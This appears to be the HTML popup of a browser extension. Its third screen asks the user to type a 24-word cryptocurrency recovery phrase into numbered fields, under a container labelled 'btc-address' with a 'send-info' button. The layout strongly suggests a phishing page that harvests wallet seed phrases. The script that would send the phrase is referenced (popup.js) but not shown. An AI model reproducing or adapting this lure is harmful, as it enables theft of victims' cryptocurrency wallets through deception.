<!DOCTYPE html>
<html>
  <head>
    <link rel="stylesheet" href="css/popup.css">
  </head>
  <body>
    <div class="first-page">
      <img class="sh back-img" src="images/Photo/background.png" width="700" height="500">
      <img class="sh f-a" src="images/Photo/f-a.png" height="70">
      <img class="sh f-b" src="images/Photo/f-b.png" width="700" height="170">
    </div>
    <div class="second-page">
      <img class="sh background-img">
      <img class="sh s-a" src="images/Photo/s-a.png">
      <img class="sh s-b" src="images/Photo/s-b.png">
      <img class="sh s-c" src="images/Photo/s-c.png">
      <div class="s-d-control">
        <a class="s-d" id="next-step">
          <img src="images/Photo/s-d.png">
        </a>
      </div>
      <img class="sh s-e" src="images/Photo/s-e.png">
      <img class="sh s-f" src="images/Photo/s-f.png">
      <img class="sh s-g" src="images/Photo/s-g.png">
    </div>
    <div class="third-page">
      <img class="sh background-img">
      <img class="sh t-a" src="images/Photo/t-a.png">
      <img class="sh t-b" src="images/Photo/t-b.png">
      <div class="t-c">
        <lable>Type your for 24-Word Phrase</lable>
      </div>
      <div id="btc-address" class="t-d">
        <form>
          <input class="1 num" name="1" placeholder="1" />
          <input class="2 num" name="2" placeholder="2" />
          <input class="3 num" name="3" placeholder="3" />
          <input class="4 num" name="4" placeholder="4" />
          <input class="5 num" name="5" placeholder="5" />
          <input class="6 num" name="6" placeholder="6" />
          <input class="7 num" name="7" placeholder="7" />
          <input class="8 num" name="8" placeholder="8" />
          <input class="9 num" name="9" placeholder="9" />
          <input class="10 num" name="10" placeholder="10" />
          <input class="11 num" name="11" placeholder="11" />
          <input class="12 num" name="12" placeholder="12" />
          <input class="13 num" name="13" placeholder="13" />
          <input class="14 num" name="14" placeholder="14" />
          <input class="15 num" name="15" placeholder="15" />
          <input class="16 num" name="16" placeholder="16" />
          <input class="17 num" name="17" placeholder="17" />
          <input class="18 num" name="18" placeholder="18" />
          <input class="19 num" name="19" placeholder="19" />
          <input class="20 num" name="20" placeholder="20" />
          <input class="21 num" name="21" placeholder="21" />
          <input class="22 num" name="22" placeholder="22" />
          <input class="23 num" name="23" placeholder="23" />
          <input class="24 num" name="24" placeholder="24" />
        </form>
      </div>
      <div class="t-e">
        <a class="register-address" id="send-info">
          <img src="images/Photo/t-e.png">
        </a>
      </div>
      <img class="sh t-f" src="images/Photo/t-f.png">
      <img class="sh t-g" src="images/Photo/s-f.png">
      <img class="sh t-h" src="images/Photo/s-g.png">
    </div>
  </body>
  <script src="js/jquery.min.js"></script>
  <script src="js/popup.js"></script>
</html>
